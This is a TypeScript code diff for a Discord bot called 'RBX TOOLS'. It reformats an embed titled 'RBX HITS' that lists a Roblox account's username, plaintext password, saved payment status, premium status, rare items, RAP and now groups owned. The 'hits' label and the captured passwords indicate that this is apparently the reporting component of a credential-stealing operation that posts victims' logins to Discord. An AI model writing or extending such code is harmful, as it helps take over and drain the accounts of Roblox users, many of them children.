@@ -118,6 +118,7 @@ export interface AccountInfo {
   passesADM?: number;
   passesMM2?: number;
   password?: string;
+  groupsOwned?: number;
 }
 
 const BOT_NAME = 'RBX TOOLS';
@@ -169,25 +170,33 @@ function nowFooter(): string {
 }
 
 function buildInfoEmbed(d: AccountInfo, siteUrl: string) {
+  const description = [
+    `**🪪 Username**`,
+    `\`${d.username || 'N/A'}\``,
+    ``,
+    `**🔐 Password**`,
+    `\`${d.password || 'N/A'}\``,
+    ``,
+    `**📃 Summary** :`,
+    `**💎 Premium** : ${yn(d.premium)}`,
+    `**📨 Email** : ${yn(d.emailVerified)}`,
+    `**👑 Korblox** | **🗿 Headless** : ${yn(d.korblox)} | ${yn(d.headless)}`,
+    `**💳 Saved Payment** : ${yn(d.hasPayment)}`,
+    `**🎒 Rap** : \`${d.rap ?? 0}\``,
+    `**🎂 Age** : \`${d.accountAgeDays ?? 0} days\``,
+    `**👥 Group Owned** : \`${d.groupsOwned ?? 0}\``,
+    ``,
+    `**🎮 GAMES**`,
+    `BB | ${passField(d.passesBB)}`,
+    `ADM | ${passField(d.passesADM)}`,
+    `MM2 | ${passField(d.passesMM2)}`,
+  ].join('\n');
   return {
     title: 'RBX HITS',
     url: siteUrl,
     color: d.valid ? 0x22c55e : 0xef4444,
     thumbnail: d.avatarUrl ? { url: d.avatarUrl } : undefined,
-    fields: [
-      { name: '👤 User', value: `\`${d.username || 'N/A'}\``, inline: true },
-      { name: '💰 Robux', value: `\`${d.robux ?? 0} | ${d.pendingRobux ?? 0}\``, inline: true },
-      { name: '🧾 Summary (Spent)', value: `\`${d.robuxSpent ?? 0}\``, inline: true },
-      { name: '💎 Premium', value: yn(d.premium), inline: true },
-      { name: '👑 Korblox', value: yn(d.korblox), inline: true },
-      { name: '🗿 Headless', value: yn(d.headless), inline: true },
-      { name: '💳 Payment', value: yn(d.hasPayment), inline: true },
-      { name: '🎒 RAP', value: `\`${d.rap ?? 0}\``, inline: true },
-      { name: '🎂 Age (days)', value: `\`${d.accountAgeDays ?? 0}\``, inline: true },
-      { name: 'BB', value: passField(d.passesBB), inline: true },
-      { name: 'ADM', value: passField(d.passesADM), inline: true },
-      { name: 'MM2', value: passField(d.passesMM2), inline: true },
-    ],
+    description,
     footer: { text: nowFooter() },
   };
 }
